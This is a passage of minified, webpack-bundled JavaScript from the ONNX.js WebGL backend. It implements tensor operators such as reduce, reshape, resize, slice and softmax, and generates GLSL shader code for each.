indices[${rank}]) {\n          int x[${rank}];\n          copyVec(indices, x);\n          int offset[${stridesRank}];\n          int pads[${padsRank}];\n          int inputDims[${rank}];\n          int kernelStrides[${stridesRank}];\n          int strides[${stridesRank}];\n          ${copyPads}\n          ${copyInputDims}\n          ${copyStrides}\n          ${copyKernelStrides}\n\n          float value = ${start};\n          int pad = 0;\n          bool isPad = false;\n          for (int i = 0; i < ${kernelSize}; i++) {\n            offsetToIndices(i, kernelStrides, offset);\n            isPad = false;\n            for (int j = ${rank} - ${stridesRank}; j < ${rank}; j++) {\n              x[j] = indices[j] * strides[j - ${rank} + ${stridesRank}]\n                + offset[j - ${rank} + ${stridesRank}] - pads[j - 2];\n              ${padCode}\n          }\n          ${op2}\n\n          return value;\n        }\n      `}},copyArray=(array,arrayName)=>{let block="";for(let i=0;i<array.length;i++)block+=`\n      ${arrayName}[${i}] = ${array[i]};\n    `;return block},offsetToIndices=rank=>`\n  void offsetToIndices(int offset, int[${rank}] strides, out int[${rank}] indices) {\n    if (${rank} == 0) {\n      return;\n    }\n    for (int i = 0; i < ${rank} - 1; ++i) {\n      indices[i] = offset / strides[i];\n      offset -= indices[i] * strides[i];\n    }\n    indices[${rank} - 1] = offset;\n  }`},"./lib/onnxjs/backends/webgl/ops/reduce.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.reduceLogSumSquare=exports.reduceLogSum=exports.reduceProd=exports.reduceMin=exports.reduceMax=exports.reduceMean=exports.reduceSum=exports.parseReduceAttributes=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),operators_1=__webpack_require__("./lib/onnxjs/operators.ts"),util_1=__webpack_require__("./lib/onnxjs/util.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),reduce=(inferenceHandler,inputs,attributes,name,reduceOp)=>{validateInputs(inputs);const reduceProgramMetadata={name:name,inputNames:["A"],inputTypes:[types_1.TextureType.unpacked]};return[inferenceHandler.run(Object.assign(Object.assign({},reduceProgramMetadata),{cacheHint:attributes.cacheKey,get:()=>createReduceProgramInfo(inferenceHandler,inputs,attributes,name,reduceOp,reduceProgramMetadata)}),inputs)]};exports.parseReduceAttributes=node=>{const axes=node.attributes.getInts("axes",[]),keepDims=1===node.attributes.getInt("keepdims",1);return(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({axes:axes,keepDims:keepDims})};const createReduceProgramInfo=(handler,inputs,attributes,name,reduceOp,reduceProgramMetadata)=>{const outputShape=[],iRank=inputs[0].dims.length||1,idxCopy=[],axes=util_1.ShapeUtil.normalizeAxes(attributes.axes,inputs[0].dims.length),ops=reduceOp(inputs,axes);let reduceOps=ops[1];for(let k=0;k<inputs[0].dims.length;k++)axes.indexOf(k)>=0||0===axes.length?(attributes.keepDims&&outputShape.push(1),reduceOps=`\n          for(int j${k} = 0; j${k} < ${inputs[0].dims[k]}; j${k}++) {\n            inputIdx[${k}] = j${k};\n            ${reduceOps}\n          }`):(idxCopy.push(`inputIdx[${k}] = outputIdx[${outputShape.length}];`),outputShape.push(inputs[0].dims[k]));const shaderSource=`\n      float process(int outputIdx[${outputShape.length||1}]) {\n        float value;                 // final result\n        int inputIdx[${iRank}];      // addressing input data\n        ${idxCopy.join("\n")}\n        ${ops[0]}       // init ops for reduce max/min\n        ${reduceOps}\n        ${ops[2]}       // final computation for reduce mean\n        return value;\n      }`;return Object.assign(Object.assign({},reduceProgramMetadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})},validateInputs=inputs=>{if(!inputs||1!==inputs.length)throw new Error("Reduce op requires 1 input.");if(-1===operators_1.NUMBER_TYPES.indexOf(inputs[0].type))throw new Error("Invalid input type.")};exports.reduceSum=(inferenceHandler,inputs,attributes)=>reduce(inferenceHandler,inputs,attributes,"ReduceSum",(()=>["value = 0.0;","value += _A(inputIdx);",""]));exports.reduceMean=(inferenceHandler,inputs,attributes)=>reduce(inferenceHandler,inputs,attributes,"ReduceMean",((inputs,axes)=>{let size=1;for(let k=0;k<inputs[0].dims.length;k++)(axes.indexOf(k)>=0||0===axes.length)&&(size*=inputs[0].dims[k]);return["value = 0.0;","value += _A(inputIdx);",`value /= ${size}.;`]}));exports.reduceMax=(inferenceHandler,inputs,attributes)=>reduce(inferenceHandler,inputs,attributes,"ReduceMax",((inputs,axes)=>{const idxZero=[];for(let k=0;k<inputs[0].dims.length;k++)(axes.indexOf(k)>=0||0===axes.length)&&idxZero.push(`inputIdx[${k}] = 0;`);return[`${idxZero.join("\n")}\nvalue = _A(inputIdx);`,"value = max(value, _A(inputIdx));",""]}));exports.reduceMin=(inferenceHandler,inputs,attributes)=>reduce(inferenceHandler,inputs,attributes,"ReduceMin",((inputs,axes)=>{const idxZero=[];for(let k=0;k<inputs[0].dims.length;k++)(axes.indexOf(k)>=0||0===axes.length)&&idxZero.push(`inputIdx[${k}] = 0;`);return[`${idxZero.join("\n")}\nvalue = _A(inputIdx);`,"value = min(value, _A(inputIdx));",""]}));exports.reduceProd=(inferenceHandler,inputs,attributes)=>reduce(inferenceHandler,inputs,attributes,"ReduceProd",(()=>["value = 1.0;","value *= _A(inputIdx);",""]));exports.reduceLogSum=(inferenceHandler,inputs,attributes)=>reduce(inferenceHandler,inputs,attributes,"ReduceLogSum",(()=>["value = 0.0;","value += _A(inputIdx);","value = log(value);"]));exports.reduceLogSumSquare=(inferenceHandler,inputs,attributes)=>reduce(inferenceHandler,inputs,attributes,"ReduceLogSumSquare",(()=>["float t; value = 0.0;","t = _A(inputIdx); value += t * t;",""]))},"./lib/onnxjs/backends/webgl/ops/reshape-packed.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.isReshapeCheap=exports.processDims3D=exports.createPackedReshape3DProgramInfoLoader=void 0;const util_1=__webpack_require__("./lib/onnxjs/util.ts"),glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),packing_utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/packing-utils.ts"),createPackedReshape3DProgramInfo=(handler,input3D,metadata,outputShape3D)=>{const inputShape3D=input3D.dims,squeezedOutputShape=outputShape3D;let mainLoop="";for(let i=0;i<4;i++){let outputCoords="";switch(i){case 0:outputCoords="outputCoords = rc;";break;case 1:outputCoords="outputCoords = ivec3(rc.x, rc.y+1, rc.z);";break;case 2:outputCoords="outputCoords = ivec3(rc.x, rc.y, rc.z+1);";break;case 3:outputCoords="outputCoords = ivec3(rc.x, rc.y+1, rc.z+1);";break;default:throw new Error}mainLoop+=`\n        ${outputCoords}\n        ${i>0?"if(outputCoords.y < rows && outputCoords.z < cols){":""}\n          int flattenedIndex = getFlattenedIndex(outputCoords);\n\n          ivec3 inputRC = inputCoordsFromReshapedOutCoords(flattenedIndex);\n          vec2 innerDims = vec2(float(inputRC.y),float(inputRC.z));\n\n          result[${i}] = getChannel(getA(inputRC.x, inputRC.y, inputRC.z), innerDims);\n\n        ${i>0?"}":""}\n      `}const glsl=(0,glsl_source_1.getGlsl)(handler.session.backend.glContext.version),shaderSource=`\n      ${function getReshapedInputCoords(shape){const strides=util_1.ShapeUtil.computeStrides(shape),coords=["b","r","c"],index="index";return`\n    ivec3 inputCoordsFromReshapedOutCoords(int index) {\n      ${strides.map(((stride,i)=>`${`int ${coords[i]} = ${index} / ${stride}`}; ${i===strides.length-1?`int ${coords[i+1]} = ${index} - ${coords[i]} * ${stride}`:`index -= ${coords[i]} * ${stride}`};`)).join("")}\n      return ivec3(b, r, c);\n    }\n  `}(inputShape3D)}\n      ${function getFlattenedIndexFrom3D(shape){const strides=util_1.ShapeUtil.computeStrides(shape);return`\n  int getFlattenedIndex(ivec3 coords) {\n    // reverse y, z order\n    return coords.x * ${strides[0]} + coords.z * ${strides[1]} + coords.y;\n  }\n`}(squeezedOutputShape)}\n      ${(0,packing_utils_1.unpackFromChannel)()}\n\n      void main() {\n        ivec3 rc = getOutputCoords();\n\n        vec4 result = vec4(0.0);\n\n        ivec3 outputCoords;\n        int rows = ${squeezedOutputShape[2]};\n        int cols = ${squeezedOutputShape[1]};\n\n        ${mainLoop}\n        ${glsl.output} = result;\n      }\n    `;return Object.assign(Object.assign({},metadata),{output:{dims:squeezedOutputShape,type:input3D.type,textureType:types_1.TextureType.packed},shaderSource:shaderSource,hasMain:!0})};exports.createPackedReshape3DProgramInfoLoader=(handler,input3D,outputShape3D)=>{const metadata=(outputShape3D=>({name:"Reshape (packed)",inputTypes:[types_1.TextureType.packed],inputNames:["A"],cacheHint:`${outputShape3D}`}))(outputShape3D);return Object.assign(Object.assign({},metadata),{get:()=>createPackedReshape3DProgramInfo(handler,input3D,metadata,outputShape3D)})},exports.processDims3D=function processDims3D(shape){if(0===shape.length)return[1,1,1];let batch=1;for(let i=0;i<shape.length-2;++i)batch*=shape[i];return[batch,shape.length>1?shape[shape.length-2]:1,shape[shape.length-1]]},exports.isReshapeCheap=function isReshapeCheap(dims,reshapedDims){let isCheapReshape=!1;return isCheapReshape=0===dims.length||0===reshapedDims.length||(dims.length<2||reshapedDims.length<2?dims[dims.length-1]===reshapedDims[reshapedDims.length-1]:dims[dims.length-1]===reshapedDims[reshapedDims.length-1]&&dims[dims.length-2]===reshapedDims[reshapedDims.length-2]),isCheapReshape}},"./lib/onnxjs/backends/webgl/ops/reshape.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.reshape=void 0;const util_1=__webpack_require__("./lib/onnxjs/util.ts");exports.reshape=(handler,inputs)=>{const reshapedDims=util_1.ShapeUtil.calculateReshapedDims(inputs[0].dims,inputs[1].integerData);return handler.session.pack?[handler.reshapePacked(inputs[0],reshapedDims)]:[handler.reshapeUnpacked(inputs[0],reshapedDims)]}},"./lib/onnxjs/backends/webgl/ops/resize-packed.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseResizeAttributesV11=exports.parseResizeAttributesV10=exports.resize=void 0;const glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/utils.ts"),packing_utils_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/packing-utils.ts"),upsample_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/upsample.ts"),resizeProgramMetadata={name:"Resize",inputNames:["A"],inputTypes:[types_1.TextureType.packed]};exports.resize=(inferenceHandler,inputs,attributes)=>{(0,upsample_1.validateInputs)(inputs,attributes);return[inferenceHandler.run(Object.assign(Object.assign({},resizeProgramMetadata),{cacheHint:attributes.cacheKey,get:()=>createPackedResizeProgramInfo(inferenceHandler,inputs,attributes)}),inputs)]};exports.parseResizeAttributesV10=node=>(0,upsample_1.parseUpsampleAttributes)(node,10);exports.parseResizeAttributesV11=node=>(0,upsample_1.parseUpsampleAttributes)(node,11);const createPackedResizeProgramInfo=(inferenceHandler,inputs,attributes)=>{const glsl=(0,glsl_source_1.getGlsl)(inferenceHandler.session.backend.glContext.version),[scales,outputShape]=prepareInputs(inputs,attributes);if(scales.every((s=>1===s))&&"tf_crop_and_resize"!==attributes.coordinateTransformMode)return Object.assign(Object.assign({},resizeProgramMetadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.packed},hasMain:!0,shaderSource:`void main() {\n                    vec4 v = ${glsl.texture2D}(X, TexCoords);\n                    ${glsl.output} = v;\n                }`});const dim=outputShape.length;if(dim<2)throw new Error(`output dimension should be at least 2, but got ${dim}`);const outputHeight=outputShape[dim-2],outputWidth=outputShape[dim-1],inputShape=inputs[0].dims;if(dim!==inputShape.length)throw new Error(`output dimension should match input ${inputShape.length}, but got ${dim}`);const inputHeight=inputShape[dim-2],inputWidth=inputShape[dim-1],scalesHeight=scales[dim-2],scalesWidth=scales[dim-1];let getSourceFracIndex="";if("linear"!==attributes.mode)throw new Error(`resize (packed) does not support mode: '${attributes.mode}'`);switch(attributes.coordinateTransformMode){case"asymmetric":getSourceFracIndex="\n                    vec4 getSourceFracIndex(ivec4 coords) {\n                        return vec4(coords) / scaleWHWH;\n                    }\n                ";break;case"half_pixel":getSourceFracIndex="\n                    vec4 getSourceFracIndex(ivec4 coords) {\n                        return (vec4(coords) + 0.5) / scaleWHWH - 0.5;\n                    }\n                ";break;case"pytorch_half_pixel":getSourceFracIndex=`\n                    vec4 getSourceFracIndex(ivec4 coords) {\n                        vec4 fcoords = vec4(coords);\n                        return vec4(\n                            ${outputWidth}.0 > 1.0 ? (fcoords.x + 0.5) / scaleWHWH.x - 0.5 : 0.0,\n                            ${outputHeight}.0 > 1.0 ? (fcoords.y + 0.5) / scaleWHWH.y - 0.5 : 0.0,\n                            ${outputWidth}.0 > 1.0 ? (fcoords.z + 0.5) / scaleWHWH.z - 0.5 : 0.0,\n                            ${outputHeight}.0 > 1.0 ? (fcoords.w + 0.5) / scaleWHWH.w - 0.5 : 0.0\n                          );\n                    }\n                `;break;case"align_corners":getSourceFracIndex=`\n                    vec4 getSourceFracIndex(ivec4 coords) {\n                        vec4 resized = vec4(${outputWidth}.0 - 1.0, ${outputHeight}.0 - 1.0, ${outputWidth}.0 - 1.0,\n                            ${outputHeight}.0 - 1.0);\n                        vec4 original = vec4(${inputWidth}.0 - 1.0, ${inputHeight}.0 - 1.0, ${inputWidth}.0 - 1.0,\n                            ${inputHeight}.0 - 1.0);\n                        vec4 new_scale = original / resized;\n                        return vec4(coords) * new_scale;\n                    }\n                `;break;default:throw new Error(`resize (packed) does not support coordinateTransformMode:                                 '${attributes.coordinateTransformMode}'`)}const coordsDataType=(0,utils_1.getCoordsDataType)(dim),shaderSource=`\n            const vec2 inputWH = vec2(${inputHeight}.0, ${inputWidth}.0);\n            const vec4 scaleWHWH = vec4(float(${scalesHeight}), float(${scalesWidth}), float(${scalesHeight}), float(${scalesWidth}));\n            ${(0,packing_utils_1.unpackFromChannel)()}\n            ${getSourceFracIndex}\n            float getAValue(int x10, int r, int c, int d) {\n                return getChannel(getA(x10, r, c, d), vec2(c, d));\n            }\n            void main() {\n                ${coordsDataType} rc = getOutputCoords();\n\n                int batch = rc[0];\n                int depth = rc[1];\n\n                // retrieve the 4 coordinates that is used in the 4 packed output values.\n                ivec4 coords = ivec4(rc.wz, rc.w + 1, rc.z + 1);\n\n                // calculate the source index in fraction\n                vec4 sourceFrac = getSourceFracIndex(coords);\n\n                // get the lower and upper bound of the 4 values that will be packed into one texel.\n                ivec4 x00 = ivec4(max(sourceFrac.xy, vec2(0.0)), min(inputWH - 1.0, ceil(sourceFrac.xy)));\n                ivec4 x01 = ivec4(max(sourceFrac.xw, vec2(0.0)), min(inputWH - 1.0, ceil(sourceFrac.xw)));\n                ivec4 x10 = ivec4(max(sourceFrac.zy, vec2(0.0)), min(inputWH - 1.0, ceil(sourceFrac.zy)));\n                ivec4 x11 = ivec4(max(sourceFrac.zw, vec2(0.0)), min(inputWH - 1.0, ceil(sourceFrac.zw)));\n\n                bool hasNextRow = rc.w < ${outputHeight-1};\n                bool hasNextCol = rc.z < ${outputWidth-1};\n\n                // pack x00, x01, x10, x11's top-left corner into one vec4 structure\n                vec4 topLeft = vec4(\n                    getAValue(batch, depth, x00.x, x00.y),\n                    hasNextCol ? getAValue(batch, depth, x01.x, x01.y) : 0.0,\n                    hasNextRow ? getAValue(batch, depth, x10.x, x10.y) : 0.0,\n                    (hasNextRow && hasNextCol) ? getAValue(batch, depth, x11.x, x11.y) : 0.0);\n\n                // pack x00, x01, x10, x11's top-right corner into one vec4 structure\n                vec4 topRight = vec4(\n                    getAValue(batch, depth, x00.x, x00.w),\n                    hasNextCol ? getAValue(batch, depth, x01.x, x01.w) : 0.0,\n                    hasNextRow ? getAValue(batch, depth, x10.x, x10.w) : 0.0,\n                    (hasNextRow && hasNextCol) ? getAValue(batch, depth, x11.x, x11.w) : 0.0);\n\n                // pack x00, x01, x10, x11's bottom-left corner into one vec4 structure\n                vec4 bottomLeft = vec4(\n                    getAValue(batch, depth, x00.z, x00.y),\n                    hasNextCol ? getAValue(batch, depth, x01.z, x01.y) : 0.0,\n                    hasNextRow ? getAValue(batch, depth, x10.z, x10.y) : 0.0,\n                    (hasNextRow && hasNextCol) ? getAValue(batch, depth, x11.z, x11.y) : 0.0);\n\n                // pack x00, x01, x10, x11's bottom-right corner into one vec4 structure\n                vec4 bottomRight = vec4(\n                    getAValue(batch, depth, x00.z, x00.w),\n                    hasNextCol ? getAValue(batch, depth, x01.z, x01.w) : 0.0,\n                    hasNextRow ? getAValue(batch, depth, x10.z, x10.w) : 0.0,\n                    (hasNextRow && hasNextCol) ? getAValue(batch, depth, x11.z, x11.w) : 0.0);\n\n                // calculate the interpolation fraction on u and v direction\n                vec4 frac = vec4(sourceFrac) - floor(sourceFrac);\n                vec4 clampFrac = clamp(frac, vec4(0.0), vec4(1.0));\n\n                vec4 top = mix(topLeft, topRight, clampFrac.ywyw);\n                vec4 bottom = mix(bottomLeft, bottomRight, clampFrac.ywyw);\n                vec4 newValue = mix(top, bottom, clampFrac.xxzz);\n\n                ${glsl.output} = vec4(newValue);\n            }\n        `;return Object.assign(Object.assign({},resizeProgramMetadata),{output:{dims:outputShape,type:inputs[0].type,textureType:types_1.TextureType.packed},hasMain:!0,shaderSource:shaderSource})},prepareInputs=(inputs,attributes)=>{const xDims=inputs[0].dims;let outputSizes,scales=attributes.scales;if(0===scales.length){const scalesTensor=inputs[attributes.scalesInputIdx];if(scalesTensor&&0!==scalesTensor.size){if(inputs[attributes.sizesInputIdx])throw new Error("Only one of scales or sizes must be provided as input.");scales=parseScalesData(scalesTensor,attributes.mode,attributes.isResize)}else{const sizesTensor=inputs[attributes.sizesInputIdx];if(!sizesTensor||0===sizesTensor.size)throw new Error("Either scales or sizes MUST be provided as input.");outputSizes=Array.from(sizesTensor.integerData),scales=parseScalesDataFromOutputSize(outputSizes,xDims,attributes.mode,attributes.isResize)}}else if(inputs[attributes.sizesInputIdx])throw new Error("Only one of scales or sizes must be provided as input.");const yDims=outputSizes||xDims.map(((dim,i)=>Math.floor(dim*scales[i])));return[scales,yDims]},parseScalesData=(scale,mode,isResize)=>{const scales=Array.from(scale.floatData);return(0,upsample_1.scalesValidation)(scales,mode,isResize),scales},parseScalesDataFromOutputSize=(yDims,xDims,mode,isResize)=>{const length=xDims.length,scales=new Array(length);for(let i=0,end=length;i<end;i++)if(0===xDims[i]){if(0!==yDims[i])throw new Error("Input dim is zero but required output dim is non-zero.");scales[i]=1}else scales[i]=yDims[i]/xDims[i];return(0,upsample_1.scalesValidation)(scales,mode,isResize),scales}},"./lib/onnxjs/backends/webgl/ops/shape.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.shape=void 0;const tensor_1=__webpack_require__("./lib/onnxjs/tensor.ts");exports.shape=(inferenceHandler,inputs)=>(validateInputs(inputs),[new tensor_1.Tensor([inputs[0].dims.length],"int32",void 0,void 0,new Int32Array(inputs[0].dims))]);const validateInputs=inputs=>{if(!inputs||1!==inputs.length)throw new Error("Shape requires 1 input.")}},"./lib/onnxjs/backends/webgl/ops/slice.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.sliceV10=exports.parseSliceAttributes=exports.slice=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),operators_1=__webpack_require__("./lib/onnxjs/operators.ts"),util_1=__webpack_require__("./lib/onnxjs/util.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),sliceProgramMetadata={name:"Slice",inputNames:["A"],inputTypes:[types_1.TextureType.unpacked]};exports.slice=(inferenceHandler,inputs,attributes)=>{validateInputs(inputs);return[inferenceHandler.run(Object.assign(Object.assign({},sliceProgramMetadata),{cacheHint:attributes.cacheKey,get:()=>createSliceProgramInfo(inferenceHandler,inputs[0],attributes)}),inputs)]};exports.parseSliceAttributes=node=>{const starts=node.attributes.getInts("starts"),ends=node.attributes.getInts("ends"),axes=node.attributes.getInts("axes",[]);return(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({starts:starts,ends:ends,axes:axes})};const createSliceProgramInfo=(inferenceHandler,input,attributes)=>{const axes=0===attributes.axes.length?input.dims.slice(0).map(((val,i)=>i)):attributes.axes,normalizedAxes=util_1.ShapeUtil.normalizeAxes(axes,input.dims.length),starts=attributes.starts.map(((start,i)=>start>input.dims[normalizedAxes[i]]-1?input.dims[normalizedAxes[i]]:util_1.ShapeUtil.normalizeAxis(start,input.dims[normalizedAxes[i]]))),ends=attributes.ends.map(((end,i)=>end>input.dims[normalizedAxes[i]]-1?input.dims[normalizedAxes[i]]:util_1.ShapeUtil.normalizeAxis(end,input.dims[normalizedAxes[i]]))),outputShape=input.dims.slice(),sliceOps=[];for(let i=0;i<normalizedAxes.length;i++)outputShape[normalizedAxes[i]]=ends[i]-starts[i],starts[i]>0&&sliceOps.push(`outputIdx[${normalizedAxes[i]}] += ${starts[i]};`);const shaderSource=`\n      float process(int outputIdx[${outputShape.length}]) {\n        ${sliceOps.join("\n      ")}\n        return _A(outputIdx);\n      }`;return Object.assign(Object.assign({},sliceProgramMetadata),{output:{dims:outputShape,type:input.type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})},validateInputs=inputs=>{if(!inputs||1!==inputs.length)throw new Error("Slice requires 1 input.");if(-1===operators_1.NUMBER_TYPES.indexOf(inputs[0].type))throw new Error("Invalid input type.")};exports.sliceV10=(inferenceHandler,inputs)=>{validateInputsV10(inputs);const attributes=generateSliceAttributesFromInputs(inferenceHandler,inputs);return[inferenceHandler.run(Object.assign(Object.assign({},sliceProgramMetadata),{cacheHint:attributes.cacheKey,get:()=>createSliceProgramInfo(inferenceHandler,inputs[0],attributes)}),[inputs[0]])]};const generateSliceAttributesFromInputs=(inferenceHandler,inputs)=>{if(!inferenceHandler.session.isInitializer(inputs[1].dataId)||!inferenceHandler.session.isInitializer(inputs[2].dataId)||inputs.length>=4&&!inferenceHandler.session.isInitializer(inputs[3].dataId)||inputs.length>=5&&!inferenceHandler.session.isInitializer(inputs[4].dataId))throw new Error("dynamic slice attributes are not allowed");if(inputs.length>=5&&inputs[4].integerData.some((i=>1!==i)))throw new Error("currently non-1 steps is not supported for Slice");const starts=Array.from(inputs[1].integerData),ends=Array.from(inputs[2].integerData),axes=inputs.length>=4?Array.from(inputs[3].integerData):[];return{starts:starts,ends:ends,axes:axes,cacheKey:`${axes};${starts};${ends}`}},validateInputsV10=inputs=>{if(!inputs||inputs.length<3||inputs.length>5)throw new Error("Invalid input number.");if("int32"!==inputs[1].type||1!==inputs[1].dims.length)throw new Error("Invalid input type.");if("int32"!==inputs[2].type||1!==inputs[2].dims.length)throw new Error("Invalid input type.");if(inputs.length>=4&&("int32"!==inputs[3].type||1!==inputs[3].dims.length))throw new Error("Invalid input type.");if(inputs.length>=5&&("int32"!==inputs[4].type||1!==inputs[4].dims.length))throw new Error("Invalid input type.")}},"./lib/onnxjs/backends/webgl/ops/softmax.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.softmaxV13=exports.parseSoftmaxAttributesV13=exports.parseSoftmaxAttributes=exports.softmax=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),util_1=__webpack_require__("./lib/onnxjs/util.ts"),glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),transpose_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/transpose.ts"),softmaxComputeMaxProgramMetadata={name:"SoftmaxComputeMax",inputNames:["A"],inputTypes:[types_1.TextureType.unpacked]},softmaxComputeScaleProgramMetadata={name:"SoftmaxComputeScale",inputNames:["A","Max"],inputTypes:[types_1.TextureType.unpacked,types_1.TextureType.unpacked]},softmaxProgramMetadata={name:"SoftMax",inputNames:["A","Max","Norm"],inputTypes:[types_1.TextureType.unpacked,types_1.TextureType.unpacked,types_1.TextureType.unpacked]};exports.softmax=(inferenceHandler,inputs,attributes)=>{validateInputs(inputs);const inputShape=inputs[0].dims.slice(),axis=util_1.ShapeUtil.normalizeAxis(attributes.axis,inputShape.length),logicalRowCount=util_1.ShapeUtil.sizeToDimension(inputShape,axis),featureCount=util_1.ShapeUtil.sizeFromDimension(inputShape,axis);return computeSoftmax(inferenceHandler,inputs,attributes,logicalRowCount,featureCount)};exports.parseSoftmaxAttributes=node=>(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({axis:node.attributes.getInt("axis",1)});exports.parseSoftmaxAttributesV13=node=>(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({axis:node.attributes.getInt("axis",-1)});exports.softmaxV13=(inferenceHandler,inputs,attributes)=>{validateInputs(inputs);const inputShape=inputs[0].dims.slice(),axis=util_1.ShapeUtil.normalizeAxis(attributes.axis,inputShape.length),rank=inputShape.length,isTransposeRequired=axis!==rank-1,transposedInputShape=[];let transposeAttribute,perm=[],transposedInputs=[];isTransposeRequired&&(perm=Array.from({length:rank}).map(((_,i)=>i)),perm[axis]=rank-1,perm[rank-1]=axis,perm.map((p=>transposedInputShape.push(inputShape[p]))),transposeAttribute=(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({perm:perm}),transposedInputs=(0,transpose_1.transpose)(inferenceHandler,inputs,transposeAttribute));const logicalRowCount=isTransposeRequired?util_1.ShapeUtil.sizeToDimension(transposedInputShape,rank-1):util_1.ShapeUtil.sizeToDimension(inputShape,rank-1),featureCount=isTransposeRequired?util_1.ShapeUtil.sizeFromDimension(transposedInputShape,rank-1):util_1.ShapeUtil.sizeFromDimension(inputShape,rank-1),output=computeSoftmax(inferenceHandler,isTransposeRequired?transposedInputs:inputs,attributes,logicalRowCount,featureCount);if(isTransposeRequired){return(0,transpose_1.transpose)(inferenceHandler,output,transposeAttribute)}return output};const computeSoftmax=(inferenceHandler,inputs,attributes,logicalRowCount,featureCount)=>{const computeMaxProgramInfo=createComputeMaxProgramInfo(inferenceHandler,inputs[0],logicalRowCount,featureCount,[logicalRowCount]),max=inferenceHandler.run(Object.assign(Object.assign({},softmaxComputeMaxProgramMetadata),{cacheHint:attributes.cacheKey,get:()=>computeMaxProgramInfo}),inputs),computeScaleProgramInfo=createComputScaleProgramInfo(inferenceHandler,inputs[0],logicalRowCount,featureCount,computeMaxProgramInfo.output.dims,[logicalRowCount]),scale=inferenceHandler.run(Object.assign(Object.assign({},softmaxComputeScaleProgramMetadata),{cacheHint:attributes.cacheKey,get:()=>computeScaleProgramInfo}),[inputs[0],max]),softMaxProgramInfo=createSoftMaxProgramInfo(inferenceHandler,inputs[0],logicalRowCount,featureCount,computeMaxProgramInfo.output.dims,computeScaleProgramInfo.output.dims);return[inferenceHandler.run(Object.assign(Object.assign({},softmaxProgramMetadata),{cacheHint:attributes.cacheKey,get:()=>softMaxProgramInfo}),[inputs[0],max,scale])]},createComputeMaxProgramInfo=(inferenceHandler,input,logicalRowCount,featureCount,outputShape)=>{const[textureWidth,textureHeight]=inferenceHandler.calculateTextureWidthAndHeight(input.dims,types_1.TextureType.unpacked),rank=outputShape.length;if(logicalRowCount<1||featureCount<1)throw new Error("Logical row count N and feature count D must be greater than or equal to 1");if(1!==outputShape.length)throw new Error("Dimensionality of the output should be 1");if(outputShape[0]!==logicalRowCount)throw new Error("Shape of the output should be equal to logical row count");const glsl=(0,glsl_source_1.getGlsl)(inferenceHandler.session.backend.glContext.version),shaderSource=`\n      float process(int[${rank}] indices) {\n        int logical_row_start_offset = indices[0] * ${featureCount};\n\n        float max = getColorAsFloat(${glsl.texture2D}(A, offsetToCoords(logical_row_start_offset, ${textureWidth},\n        ${textureHeight} )));\n        for(int i=1; i<${featureCount}; ++i)\n        {\n          float current = getColorAsFloat(${glsl.texture2D}(A, offsetToCoords(logical_row_start_offset + i,\n            ${textureWidth}, ${textureHeight})));\n          if(current > max)\n          max = current;\n        }\n\n        return max;\n      }`;return Object.assign(Object.assign({},softmaxComputeMaxProgramMetadata),{output:{dims:outputShape,type:input.type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})},createComputScaleProgramInfo=(inferenceHandler,input,logicalRowCount,featureCount,maxElementPerLogicalRow,outputShape)=>{const[textureWidth,textureHeight]=inferenceHandler.calculateTextureWidthAndHeight(input.dims,types_1.TextureType.unpacked),rank=outputShape.length;if(logicalRowCount<1||featureCount<1)throw new Error("Logical row count N and feature count D must be greater than or equal to 1");if(1!==outputShape.length)throw new Error("Dimensionality of the output should be 1");if(outputShape[0]!==logicalRowCount)throw new Error("Shape of the output should be equal to logical row count");if(1!==maxElementPerLogicalRow.length)throw new Error("Dimensionality of the intermediate results should be 1");if(maxElementPerLogicalRow[0]!==logicalRowCount)throw new Error("Shape of the intermediate results should be equal to logical row count");const shaderSource=`\n      float process(int[${rank}] indices) {\n        int logical_row_start_offset = indices[0] * ${featureCount};\n\n        float norm_factor = 0.0;\n        float max = _Max(indices);\n        for(int i=0; i<${featureCount}; ++i)\n        {\n          norm_factor += exp(getColorAsFloat(${(0,glsl_source_1.getGlsl)(inferenceHandler.session.backend.glContext.version).texture2D}(A, offsetToCoords(logical_row_start_offset + i,\n            ${textureWidth}, ${textureHeight}))) - max);\n        }\n\n        return 